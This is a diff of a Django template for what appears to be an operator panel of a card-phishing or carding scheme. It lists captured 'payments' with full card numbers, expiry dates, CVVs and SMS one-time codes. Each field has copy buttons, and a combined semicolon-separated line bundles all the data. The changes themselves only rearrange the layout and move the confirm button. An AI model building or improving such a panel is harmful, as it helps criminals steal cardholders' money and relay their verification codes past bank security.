@@ -27,7 +27,7 @@
     <div class="row">
 
     {% for payment in page_obj %}
-    <div class="col-3 card" style="background-color: #e0fff6">
+    <div class="col-4 card" style="background-color: #e0fff6">
       <form method="post" action=''>
       {% csrf_token %}
 
@@ -42,31 +42,35 @@
                  #f6e79e
              {% endif %}
              ;">
-            <div class="col-3">
+            <div class="col">
                  № {{ payment.counter }}
             </div>
-            <div class="col-7">
+            <div class="col">
                  {{ payment.create_at|date:"d.m.Y H:i:s" }}
             </div>
             <div class="col-2">
                  <button name="cancel_payment" value="{{ payment.id }}" style="margin-bottom: 0px; margin-top: -10px; height: 25px;font-size: small" type="submit" class="btn btn-danger btn-sm">X</button>
             </div>
+            <div class="row "position-relative"><div class="col position-relative text-center">{{ payment.bank_name }}</div></div>
         </div>
         <div class="card-body" {% if payment.sms_code %} style="background-color: rgba(20,245,255,0.58)"{% endif %}>
                   {% load l10n %}
             {% localize off %}
             <div class="row" id="amount{{ forloop.counter }}">
                  {{ payment.amount }}<img class="img-thumbnail" onclick="CopyToClipboard('amount{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
+
             </div>
         {% endlocalize %}
             <div class="row">
-                <div class="col-auto" id="card_number{{ forloop.counter }}">{{ payment.card_number }}</div><img class="img-thumbnail" onclick="CopyToClipboard('card_number{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}"><div class="col-4">{{ payment.bank_name }}</div>
+                <div class="col-auto" style="" id="card_number{{ forloop.counter }}">{{ payment.card_number }}</div><img class="img-thumbnail" onclick="CopyToClipboard('card_number{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
             </div>
             <div class="row" id="expired_month{{ forloop.counter }}">
                 {% if payment.expired_month < 10 %}0{%  endif %}{{ payment.expired_month }}/{{ payment.expired_year }}<img class="img-thumbnail" onclick="CopyToClipboard('expired_month{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
             </div>
             <div class="row " id="cvv{{ forloop.counter }}">
                  {{ payment.cvv }}<img class="img-thumbnail" onclick="CopyToClipboard('cvv{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
+                <div class="col-5"></div>
+                <div class="col"><button name="confirm_payment" value="{{ payment.id }}" style="margin-bottom: 0px; margin-top: -10px; height: 25px;font-size: small" type="submit" class="btn btn-success btn-sm">OK</button></div>
             </div>
 
             <div class="row">
@@ -76,17 +80,17 @@
                 </div>
                 <img class="img-thumbnail" onclick="CopyToClipboard('sms_code{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
                     <div class="col-2">
-                     <button name="confirm_payment" value="{{ payment.id }}" style="margin-bottom: 0px; margin-top: -10px; height: 25px;font-size: small" type="submit" class="btn btn-success btn-sm">OK</button>
                 </div>
             </div>
 
             <div class="row">
-                <div class="col-auto" id="all_data{{ forloop.counter }}">
+                <div class="col-auto" id="all_data{{ forloop.counter }}" style="font-size: xx-small">
                      {{ payment.amount }};{{ payment.card_number }};{% if payment.expired_month < 10 %}0{%  endif %}{{ payment.expired_month }}/{{ payment.expired_year }};{{ payment.cvv }};{{ payment.sms_code|default_if_none:'' }}
 
                 </div>
                 <img class="img-thumbnail" onclick="CopyToClipboard('all_data{{ forloop.counter }}')"  src="{% static '/img/copy2.png' %}">
                     <div class="col-2">
+
 
                 </div>
             </div>
